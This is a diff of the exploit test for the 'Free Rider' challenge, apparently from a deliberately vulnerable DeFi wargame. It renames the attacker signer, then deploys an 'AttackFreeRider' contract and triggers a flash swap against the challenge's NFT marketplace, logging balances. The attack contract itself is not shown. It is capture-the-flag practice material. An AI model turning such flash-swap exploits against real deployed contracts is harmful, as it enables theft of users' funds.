@@ -150,12 +150,12 @@ describe('[Challenge] Free Rider', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
 
-        const attackWeth = this.weth.connect(attacker);
-        const attackToken = this.token.connect(attacker);
-        const attackFactory = this.uniswapFactory.connect(attacker);
-        const attackMarketplace = this.marketplace.connect(attacker);
-        const attackBuyer = this.buyerContract.connect(attacker);
-        const attackNft = this.nft.connect(attacker);
+        const attackWeth = weth.connect(player);
+        const attackToken = token.connect(player);
+        const attackFactory = uniswapFactory.connect(player);
+        const attackMarketplace = marketplace.connect(player);
+        const attackBuyer = devsContract.connect(player);
+        const attackNft = nft.connect(player);
 
         // Helper function to log balances
         const logBalances = async (address, name) => {
@@ -168,10 +168,10 @@ describe('[Challenge] Free Rider', function () {
         }
 
         console.log("Initial balances");
-        await logBalances(attacker.address, "attacker");
+        await logBalances(player.address, "attacker");
 
 
-        const AttackFactory = await ethers.getContractFactory("AttackFreeRider", attacker);
+        const AttackFactory = await ethers.getContractFactory("AttackFreeRider", player);
         const attackContract = await AttackFactory.deploy(
             attackWeth.address, 
             attackFactory.address,
@@ -179,6 +179,7 @@ describe('[Challenge] Free Rider', function () {
             attackMarketplace.address,
             attackBuyer.address,
             attackNft.address,
+            player.address
             );
 
         await attackContract.flashSwap(attackWeth.address, NFT_PRICE, {
@@ -186,7 +187,7 @@ describe('[Challenge] Free Rider', function () {
         });
 
         console.log("*** FLASH SWAP EXECUTED ***");
-        await logBalances(attacker.address, "attacker");
+        await logBalances(player.address, "attacker");
     });
 
     after(async function () {
